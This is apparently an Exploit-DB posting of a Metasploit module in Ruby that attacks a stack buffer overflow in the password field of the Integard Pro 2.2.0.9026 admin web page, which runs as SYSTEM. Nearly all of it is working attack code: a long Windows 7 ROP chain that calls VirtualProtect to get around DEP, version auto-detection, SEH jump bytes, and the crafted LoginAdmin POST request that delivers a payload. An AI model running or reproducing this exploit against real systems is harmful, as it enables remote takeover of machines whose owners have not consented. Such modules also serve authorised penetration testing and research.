# Exploit Title: Integard Pro 2.2.0.9026 (Win7 ROP-Code Metasploit Module)
# Date: 2010-09-15
# Author: Node
# Software Link: http://www.exploit-db.com/application/14941
# Version: Race River Integard Pro 2.2.0.9026, integard32.dll(v.2.0.0.306)
# Tested on: Windows 7 x64 Eng
# CVE : -

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking # stack bof, seh, universal ret, auto targeting

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Race River Integard Home/Pro LoginAdmin Password Stack Buffer Overflow',
			'Description'    => %q{
						This module exploits a stack buffer overflow in Race river's Integard Home/Pro
					internet content filter HTTP Server. Versions prior to 2.0.0.9037 and 2.2.0.9037 are
					vulnerable.

					The administration web page on port 18881 is vulnerable to a remote buffer overflow
					attack. By sending an long character string in the password field, both the structured
					exception handler and the saved extended instruction pointer are over written, allowing
					an attacker to gain control of the application and the underlying operating system
					remotely.

					The administration website service runs with SYSTEM privileges, and automatically
					restarts when it crashes.
			},
			'Author'  =>
				[
					'Lincoln', # original discovery
					'Nullthreat',
					'rick2600',
					'corelanc0d3r',
					'jduck', # fleshed out module from advisory
					'Node' # Win7 rop-code
				],
			'License'       => MSF_LICENSE,
			'Version'       => '$Revision: 99999 $',
			'References'    =>
				[
					['OSVDB', '67909'],
					['URL','http://www.corelan.be:8800/advisories.php?id=CORELAN-10-061'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars'  => "\x00\x20\x26\x2f\x3d\x3f\x5c",
					'StackAdjustment' => -1500,
				},
			'Platform'       => 'win',
			'Privileged'     => false,
			'Targets'        =>
				[
					[ 'Automatic Targeting',          { 'auto' => true }],
					[ 'Integard Home 2.0.0.9021', { 'Ret' => 0x0041565E,}], # p/p/r
					[ 'Integard Pro  2.2.0.9026', { 'Ret' => 0x0040362C,}], # p/p/r
					[ 'Integard Pro  2.2.0.9026, integard32.dll(v.2.0.0.306) (Windows 7 x64 Eng)', { 'Win7' => true,}]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Sep 07 2010'))

		register_options(
			[
				Opt::RPORT(18881)
			], self.class )
	end

	def exploit

		rop = [0x10010793].pack('V') # RET
		rop << rand_text_alpha_upper(20)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << [0xFFB8A378].pack('V') # PUSH ESP # SUB EAX,20 # POP EBX # RETN
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x100111B7].pack('V')  # ADD ESP,2C # POP ESI # POP EBP # RETN
		rop << "1111" #VirtualProtect placeholder
		rop << "2222" #return address placeholder
		rop << "3333" #lpAddress placeholder
		rop << "4444" #dwsize placeholder
		rop << "5555" #flNewProtect placeholder
		rop << [0x10019005].pack('V') # writable
		rop << rand_text_alpha_upper(28)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << [0xFFBBA5CE].pack('V') # INC EBX # RETN
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x10010EB5].pack('V')  # POP EDI # POP ESI # RETN
		rop << [0x10019005].pack('V') # writable
		rop << rand_text_alpha_upper(4)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << [0xFFB95B6F].pack('V')  # PUSH EBX # SBB BYTE PTR DS:[EDI+5E],BL # POP EBP # MOV EAX,-2 # POP EBX # RETN
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << [0xFFFFF41C].pack('V') #length to kernel32
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x10010C6B].pack('V')  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
		rop << rand_text_alpha_upper(4)
		rop << [0x100107E8].pack('V') # POP EAX # POP ESI # RETN
		rop << rand_text_alpha_upper(16) 
		rop << [0xEFFF2E41].pack('V') # ADD EBX,EBP # RETN
		rop << rand_text_alpha_upper(4)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << [0xEFFF2E41].pack('V') # ADD EBX,EBP # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x10010C69].pack('V')  # MOV EDX,EBX # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
		rop << rand_text_alpha_upper(4)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << rand_text_alpha_upper(16) 
		rop << [0xEFFFA79E].pack('V') # XCHG EAX,EBP # POP ESI # POP EBP # POP EDI # POP EBX # POP ECX # RETN
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << rand_text_alpha_upper(16) 
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x10010C6B].pack('V')  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
		rop << rand_text_alpha_upper(4)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << rand_text_alpha_upper(16) 
		rop << [0xFFB81B31].pack('V') # MOV EAX,EDX # RETN
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x100137AB].pack('V')  # MOV EAX,DWORD PTR DS:[EAX] # POP ESI # POP EBP # RETN
		rop << rand_text_alpha_upper(8)
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x10010C69].pack('V')  # MOV EDX,EBX # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
		rop << rand_text_alpha_upper(4)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << rand_text_alpha_upper(16) 
		rop << [0xFFFFFE75].pack('V') # length to VP
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x10013B9D].pack('V')  # MOV EAX,EBX # POP EBX # POP EBP # RETN
		rop << rand_text_alpha_upper(8)
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x10010C6B].pack('V')  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
		rop << rand_text_alpha_upper(4)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << rand_text_alpha_upper(16) 
		rop << [0xFFB81B31].pack('V')  # MOV EAX,EDX # RETN
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x10013B9D].pack('V')  # MOV EAX,EBX # POP EBX # POP EBP # RETN
		rop << rand_text_alpha_upper(8)
		rop << [0x1001072D].pack('V')  # MOV DWORD PTR DS:[ECX],EAX # POP EBP # RET
		rop << rand_text_alpha_upper(4)
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x1001072D].pack('V')  # MOV DWORD PTR DS:[ECX],EAX # POP EBP # RET
		rop << rand_text_alpha_upper(4)
		rop << [0x10010C6B].pack('V')  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
		rop << rand_text_alpha_upper(4)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << rand_text_alpha_upper(16) 
		rop << [0xFFFFF868].pack('V')  # length to shellcode
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x10010C69].pack('V')  # MOV EDX,EBX # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
		rop << rand_text_alpha_upper(4)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << rand_text_alpha_upper(16) 
		rop << [0xFFB81B31].pack('V')  # MOV EAX,EDX # RETN
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x10010C69].pack('V')  # MOV EDX,EBX # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
		rop << rand_text_alpha_upper(4)
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << rand_text_alpha_upper(16) 
		rop << [0x10010798].pack('V')  # ADD DWORD PTR DS:[EAX],EDX # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x100137AB].pack('V')  # MOV EAX,DWORD PTR DS:[EAX] # POP ESI # POP EBP # RETN
		rop << rand_text_alpha_upper(8)
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x1001072D].pack('V')  # MOV DWORD PTR DS:[ECX],EAX # POP EBP # RET
		rop << rand_text_alpha_upper(4)
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x10010C6B].pack('V')  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
		rop << rand_text_alpha_upper(4)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << rand_text_alpha_upper(16) 
		rop << [0xFFFFFC18].pack('V')  # size (1000)
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x10013B9D].pack('V') # MOV EAX,EBX # POP EBX # POP EBP # RETN
		rop << rand_text_alpha_upper(8)
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x1001072D].pack('V')  # MOV DWORD PTR DS:[ECX],EAX # POP EBP # RET
		rop << rand_text_alpha_upper(4)
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x100114C8].pack('V')  # ADD EAX,1 # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x10010C6B].pack('V')  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
		rop << rand_text_alpha_upper(4)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << rand_text_alpha_upper(16) 
		rop << [0xFFFFFFC0].pack('V')  # newprotect(0x40)
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x10013B9D].pack('V') # MOV EAX,EBX # POP EBX # POP EBP # RETN
		rop << rand_text_alpha_upper(8)
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x1001072D].pack('V')  # MOV DWORD PTR DS:[ECX],EAX # POP EBP # RET
		rop << rand_text_alpha_upper(4)
		rop << [0x10010C6B].pack('V')  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
		rop << rand_text_alpha_upper(4)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << rand_text_alpha_upper(16) 
		rop << [0xFFFFFFF0].pack('V') # length to saved VP on the stack
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x10013B9D].pack('V') # MOV EAX,EBX # POP EBX # POP EBP # RETN
		rop << rand_text_alpha_upper(8)
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x10010C6B].pack('V')  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
		rop << rand_text_alpha_upper(4)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << rand_text_alpha_upper(16) 
		rop << [0xEFFF2818].pack('V')  # XCHG EAX,ESP # RETN
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10012EC7].pack('V')  # XCHG EAX,ECX # RETN
		rop << [0x10010C69].pack('V')  # MOV EDX,EBX # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
		rop << rand_text_alpha_upper(4)
		rop << [0x100106E6].pack('V')  # POP ECX # RETN
		rop << rand_text_alpha_upper(16) 
		rop << [0xFFB81B31].pack('V')  # MOV EAX,EDX # RETN
		rop << [0x100109B0].pack('V')  # MOV EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x10010A2A].pack('V')  # SUB EAX,ECX # RETN
		rop << [0x1001274C].pack('V')  # CALL EAX # RETN
		rop << [0x10010F0B].pack('V')  # CALL EBX # ...

		mytarget = nil
		if (target['auto'])
			print_status("Automatically detecting the target...")
			response = send_request_raw(
				{
					'uri' => '/banner.jpg',
					'version' => '1.1',
					'method' => 'GET'
				}, 5)

			case response['Content-Length'].to_i
			when 24584
				print_status("[!] Found Version - Integard Home")
				mytarget = targets[1]
			when 23196
				mytarget = targets[2]
				print_status("[!] Found Version - Integard Pro")
			end

		else
			mytarget = target
		end

		if not mytarget
			raise RuntimeError, "Unable to automatically detect the target version"
		end

		print_status("Selected Target: #{mytarget.name}")

		print_status("Building Buffer")
		pay = payload.encoded
		if (target['Win7'])
			buffer = rand_text_alpha_upper(832)
			buffer << rop
			buffer << rand_text_alpha_upper(2000 - rop.length)
			buffer << pay
			buffer << rand_text_alpha_upper(1000 - pay.length)
		else

			buffer = ''
			buffer << rand_text_alpha_upper(3091 - pay.length)
			buffer << pay
			buffer << "\xE9\x2B\xF8\xFF\xFF"
			buffer << "\xEB\xF9\x90\x90"
			buffer << [mytarget.ret].pack('V')
		end
			print_status("Sending Request")
			send_request_raw({
					'uri' => '/LoginAdmin',
					'version' => '1.1',
					'method' => 'POST',
					'headers' =>
						{
							'Host' => '192.168.1.1:18881',
							'Content-Length' => 1074
						},
					'data' => "Password=" + buffer + "&Redirect=%23%23%23REDIRECT%23%23%23&NoJs=0&LoginButtonName=Login"
				}, 5)

			print_status("Request Sent")

			handler
	end
end
